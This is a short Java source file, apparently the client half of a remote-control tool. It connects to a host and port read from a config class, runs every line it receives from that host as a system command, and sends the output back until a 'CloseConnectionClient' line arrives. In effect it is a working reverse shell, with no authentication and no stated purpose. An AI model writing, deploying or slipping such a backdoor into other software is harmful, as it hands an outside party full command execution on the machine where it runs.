package Client;

import Config.Config;

import java.io.*;
import java.net.Socket;

public class Main {

    public static void sendResult(String result, Socket s) throws IOException {
        PrintWriter pr = new PrintWriter(s.getOutputStream());
        pr.println(result);
        pr.flush();
    }

    public static String commandRun(String str) {
        String result = "";
        int i;

        try {
            Process process = Runtime.getRuntime().exec(str);
            InputStream inputstream = process.getInputStream();
            BufferedInputStream bufferedinputstream = new BufferedInputStream(inputstream);

            while((i=bufferedinputstream.read()) != -1) {
                result += (char)i;
            }

            bufferedinputstream.close();
            bufferedinputstream.close();
        } catch (Exception ignored) {}

        return result;
    }

    public static void main(String[] args) throws IOException {
        Socket s = new Socket(Config.getHost(), Config.getPort());
        boolean exe = true;

        do {
            InputStreamReader in = new InputStreamReader(s.getInputStream());
            BufferedReader bf = new BufferedReader(in);
            String str = bf.readLine();

            if(str.equals("CloseConnectionClient")) exe = false;
            else sendResult(commandRun(str), s);
        } while (exe);
    }
}
